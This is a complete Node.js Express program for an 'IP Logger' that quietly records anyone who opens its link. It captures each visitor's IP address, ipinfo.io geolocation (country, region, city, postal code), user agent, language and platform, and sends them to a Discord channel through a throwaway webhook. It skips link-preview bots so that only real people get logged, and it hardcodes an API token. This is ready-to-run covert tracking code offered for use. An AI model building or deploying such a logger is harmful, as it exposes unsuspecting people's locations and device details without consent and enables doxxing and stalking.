const express = require("express");
const { Webhook, MessageBuilder } = require("discord-webhook-node");
const fetch = require("isomorphic-fetch");
const app = express();

const botToken = process.env.bot_token;
const channelID = process.env.channel_id;
const port = process.env.port || 3000;

const unwantedUserAgents = [
  "Vercelbot/0.1 (+https://vercel.com/)",
  "got (https://github.com/sindresorhus/got)"
];

async function sendWebhook(channelID, embed) {
  const createUrl = `https://discord.com/api/v10/channels/${channelID}/webhooks`;

  try {
    const createResponse = await fetch(createUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bot ${botToken}`,
      },
      body: JSON.stringify({
        name: "Logger Webhook",
      }),
    });
    const createData = await createResponse.json();
    const webhookUrl = `https://discord.com/api/v10/webhooks/${createData.id}/${createData.token}`;

    const webhook = new Webhook(webhookUrl);
    await webhook.send(embed);

    const deleteUrl = `https://discord.com/api/v10/webhooks/${createData.id}/${createData.token}`;
    await fetch(deleteUrl, {
      method: "DELETE",
      headers: {
        Authorization: `Bot ${botToken}`,
      },
    });
  } catch (error) {
    console.error(`Error sending webhook: ${error}`);
    throw error;
  }
}

app.get("/", async (req, res) => {
  const ipAddress = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  console.log("User Agent:", userAgent); // Check useragent for errors why still logging
  if (unwantedUserAgents.includes(userAgent)) { res.status(200).send("Skipping unwanted User Agent"); 
  return; } // Check if the current userAgent is in the unwantedUserAgents list
  const response = await fetch(`https://ipinfo.io/${ipAddress}?token=2001557f8b906a`);
  const data = await response.json();
  const { region, city, country, postal } = data;
  const lang = req.headers["accept-language"]?.split(",")[0] || "Unknown";
  const platform = userAgent ? userAgent.split("(")[1].split(")")[0] : "Unknown";
  const browser = userAgent ? userAgent.split("/")[0] : "Unknown";
  const isProxy = req.headers["via"] || req.headers["x-forwarded-for"];
  
  try {
    const embed = new MessageBuilder()
      .setTitle("IP Logger")
      .setDescription("This is an IP logger made by https://github.com/baum1810")
      .addField("IP", ipAddress)
      .addField("Country", country)
      .addField("Region", region)
      .addField("City", city)
      .addField("Postal", postal)
      .addField("User Agent", userAgent)
      .addField("Browser Language", lang)
      .addField("Platform", platform)
      .addField("Browser", browser)
      .addField("Proxy/VPN", isProxy ? "Yes" : "No")
      .setColor("#5CDBF0")
      .setTimestamp();

    await sendWebhook(channelID, embed);
    res.send("Address Logged");
  } catch (error) {
    console.error(`Error handling request: ${error}`);
    res.status(500).send("Internal server error");
  }
});

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`);
});
